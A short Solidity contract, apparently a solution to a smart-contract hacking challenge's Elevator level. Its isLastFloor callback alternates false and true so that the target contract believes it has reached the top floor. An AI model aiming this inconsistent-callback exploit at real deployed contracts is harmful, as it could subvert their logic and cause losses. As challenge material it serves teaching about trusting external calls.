// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract HackElevator {
    uint256 callTimes = 0;
    address immutable ELEVATOR;

    constructor (address _elevator) {
        ELEVATOR = _elevator;
    }

    function goTo() external {
        IElevator(ELEVATOR).goTo(block.timestamp);
    }

    function isLastFloor(uint floor) external returns (bool) {
        floor;
        callTimes++;
        return callTimes % 2 == 0? true:false;
    }
}